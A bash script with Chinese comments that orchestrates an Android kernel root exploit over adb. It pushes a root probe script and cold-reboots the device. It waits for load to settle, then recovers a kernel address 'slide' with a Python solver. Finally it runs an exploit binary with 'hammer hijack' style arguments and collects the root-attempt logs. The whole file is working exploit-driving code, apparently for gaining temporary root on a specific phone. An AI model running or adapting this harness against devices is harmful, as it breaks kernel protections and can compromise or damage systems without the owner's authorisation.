#!/bin/bash
# round2.sh — 主机侧一条龙: 推脚本 -> 冷启动 -> 等 load1<6 -> 解 slide -> ishell 里跑 root_probe2 -> 回读日志
set -u
cd "/g/项目/Windows管理/usb/临时root" || exit 1
DEV=<DEVICE_SERIAL>
A() { MSYS2_ARG_CONV_EXCL='*' adb -s "$DEV" "$@"; }

A push cm57/root_probe2.sh /data/local/tmp/root_probe2.sh >/dev/null || { echo "[r2] push 失败"; exit 1; }
A shell "chmod 755 /data/local/tmp/root_probe2.sh"
echo "[r2] 冷启动(本 boot 的相0 零洞已用过)"
A reboot
A wait-for-device
for i in $(seq 1 40); do
  o=$(A shell "getenforce" 2>/dev/null | tr -d '\r')
  case "$o" in *Enforcing*|*Permissive*) break ;; esac
  sleep 5
done
echo "[r2] shell 可用: $o"
for i in $(seq 1 24); do
  l=$(A shell "cat /proc/loadavg" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  up=$(A shell "cat /proc/uptime" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  ip=${l%%.*}; [ -n "$ip" ] || ip=9
  echo "[r2] uptime=$up load1=$l (门槛 <6)"
  [ "$ip" -lt 6 ] && { echo "[r2] 负载落定"; break; }
  sleep 15
done
python cm57/solve_only.py 30 > cm57/solve2.log 2>&1
S=$(grep -a 'SOLVE_ONLY_RESULT' cm57/solve2.log | awk '{print $2}')
echo "[r2] slide=$S"
[ -z "$S" ] || [ "$S" = "NONE" ] && { echo "[r2] 没解出 slide, 停"; exit 2; }
for i in $(seq 1 8); do
  l=$(A shell "cat /proc/loadavg" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  ip=${l%%.*}; [ -n "$ip" ] || ip=9
  [ "$ip" -lt 6 ] && break
  echo "[r2] 采样把负载抬高了(load1=$l), 再等"; sleep 15
done
uname_s=$(A shell "uname -s" | tr -d '\r')
echo "[r2] 打之前 uname -s = [$uname_s] (必须是 Linux 才说明本 boot 没 punch 过)"
printf 'sh /data/local/tmp/root_probe2.sh %s; exit\n' "$S" | \
  A shell -tt "cd /data/local/tmp && ./pr $S hammer hijack shape2 sen victim ishell ph2=0 ncopy5 shots=25 maxr=8 nph=7 rounds=200 wcpu=6 mcpu=0 kids" \
  > cm57/rootprobe2_run.log 2>&1
echo "[r2] ishell 轮次 rc=$? (日志 cm57/rootprobe2_run.log)"
A shell "cat /data/local/tmp/root_probe2.log" > cm57/root_probe2_dev.log 2>&1
A shell "cat /data/local/tmp/kgate.log" > cm57/kgate_root.log 2>&1
echo "[r2] 完成"
